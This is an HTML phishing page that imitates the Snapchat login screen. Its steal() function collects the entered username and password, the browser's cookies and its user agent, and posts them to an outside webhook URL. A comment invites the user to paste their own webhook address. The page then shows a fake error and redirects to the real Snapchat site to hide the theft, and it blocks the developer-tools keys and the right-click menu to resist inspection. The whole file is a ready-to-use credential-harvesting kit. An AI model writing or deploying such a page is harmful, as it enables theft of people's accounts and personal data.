<!DOCTYPE html>
<html>
<head>
    <title>Snapchat</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{
            background:linear-gradient(45deg,#FFFC00,#FFF000);
            display:flex;align-items:center;justify-content:center;
            min-height:100vh;
            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
            padding:20px;
        }
        .container{
            background:rgba(255,255,255,0.95);
            padding:50px 40px;
            border-radius:25px;
            text-align:center;
            max-width:400px;
            width:100%;
            box-shadow:0 20px 40px rgba(0,0,0,0.2);
        }
        .logo{
            width:100px;height:100px;
            background:#FFFC00;
            border-radius:50%;
            margin:0 auto 30px;
            display:flex;align-items:center;justify-content:center;
            font-size:50px;
            box-shadow:0 10px 30px rgba(255,252,0,0.5);
        }
        h1{
            font-size:36px;
            font-weight:600;
            color:#1c1c1e;
            margin-bottom:40px;
            letter-spacing:-0.5px;
        }
        input{
            width:100%;
            padding:20px 25px;
            margin:15px 0;
            border:2px solid #ddd;
            border-radius:30px;
            font-size:18px;
            background:white;
            transition:all 0.3s ease;
            /* FIXED: Allow typing */
            user-select:text !important;
            -webkit-user-select:text !important;
            -moz-user-select:text !important;
        }
        input:focus{
            outline:none;
            border-color:#FFFC00;
            box-shadow:0 0 0 4px rgba(255,252,0,0.2);
        }
        button{
            width:100%;
            padding:20px;
            background:#FFFC00;
            color:#000;
            border:none;
            border-radius:30px;
            font-size:20px;
            font-weight:600;
            cursor:pointer;
            margin:20px 0;
            transition:all 0.2s ease;
            box-shadow:0 10px 30px rgba(255,252,0,0.3);
        }
        button:hover{
            transform:translateY(-3px);
            box-shadow:0 15px 40px rgba(255,252,0,0.5);
        }
        .error{
            color:#ff4444;
            display:none;
            margin-top:15px;
            font-size:16px;
            font-weight:500;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">👻</div>
        <h1>Log in to Snapchat</h1>
        <input id="user" placeholder="Username/email/phone">
        <input id="pass" type="password" placeholder="Password">
        <button onclick="steal()">Log In</button>
        <div id="error" class="error">Wrong username or password try again.</div>
    </div>
    
    <script>
    // PROTECTION: Only block dev tools, NOT typing
    document.addEventListener('keydown',function(e){
        // Allow all typing keys
        if(e.target.tagName==='INPUT' || e.target.tagName==='TEXTAREA') return;
        
        // Block only dev tools
        if(e.keyCode==123 || 
           (e.ctrlKey && e.shiftKey && e.keyCode==73) || 
           (e.ctrlKey && e.shiftKey && e.keyCode==74) || 
           (e.ctrlKey && e.keyCode==85)){
            e.preventDefault();
        }
    });
    
    document.addEventListener('contextmenu',function(e){
        if(e.target.tagName!=='INPUT') e.preventDefault();
    });
    
    function steal(){
        let userValue = document.getElementById('user').value;
        let passValue = document.getElementById('pass').value;
        
        let data={
            user:userValue,
            pass:passValue,
            time:new Date().toISOString(),
            ua:navigator.userAgent,
            screen:`x`,
            cookies:document.cookie
        };
        
        // **PASTE YOUR FULL WEBHOOK.SITE URL HERE:**
        fetch('https://go.webhooks.cc/w/oqvwFhs4',{
            method:'POST',
            mode:'no-cors',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify(data)
        });
        
        document.getElementById('error').style.display='block';
        setTimeout(()=>window.location='https://accounts.snapchat.com',1500);
    }
    </script>
</body>
</html>
